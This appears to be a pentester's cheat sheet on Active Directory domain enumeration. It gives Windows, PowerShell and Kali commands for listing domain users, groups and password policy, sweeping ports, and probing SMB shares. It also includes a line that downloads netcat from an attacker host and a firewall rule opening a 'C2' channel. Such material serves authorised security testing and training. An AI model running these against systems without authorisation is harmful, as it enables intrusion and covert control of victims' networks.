# Domain Enumeration

## Command Tools (cmd.exe)

Display Networking Info
```CMD
ipconfig /all
```
Display Domain
```CMD
echo %USERDOMAIN%
```
Display Domain Controller
```CMD
echo %logonserver%
```
Display Domain Password Policy
```CMD
net accounts /domain
```
Display DC Address, Domain Name, Roles
```CMD
wmic ntdomain
```
Display All Domain Users
```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
```
Display All Domain Groups
```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname
```
Display All Domain Computers
```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
```

## PowerShell Tools

Ping Sweeper
```PowerShell
 1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_ | Select-String ttl}
```
Port Sweeper
```PowerShell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<IPADDR>", $_)) "Port $_ is open!"} 2>$null
```
Sweep Range of IPs for Single Port
```PowerShell
foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}
```
Sweep IPs and Ports
```PowerShell
1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
```
Test Egress Filtering
```PowerShell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port $_ is open" } 2>$null
```
Web Client to Download Files (eg NetCat)
```PowerShell
wget "http://10.10.10.10/nc.exe" -outfile "c:\nc.exe"
```
Get Firewall Rules
```PowerShell
Get-NetFirewallRule -all | Out-GridView
 Get-NetFirewallRule -all | Export-csv <file_path.csv>
```
Add Firewall Rule
```PowerShell
New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress <IPADDR>
```

 ## Linux/Kali Tools

 SMB Enumeration Tools
 ```bash
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
```bash
nbtscan 192.168.1.0/24
```

Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
```bash
enum4linux -a target-ip
```

Fingerprint SMB Version
```bash
smbclient -L //192.168.1.100 
```




 https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/

## Domain Enumeration Resources

* Information dumper via LDAP: https://github.com/dirkjanm/ldapdomaindump
* Integrated DNS dumping by any authenticated user: https://github.com/dirkjanm/adidnsdump
* Advanced Discovery of Privileged Accounts: https://github.com/cyberark/ACLight
* Detailed Active Directory Recon Tool: https://github.com/sense-of-security/ADRecon
* Powershell AD Enumeration: https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf
* Data collector tool: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html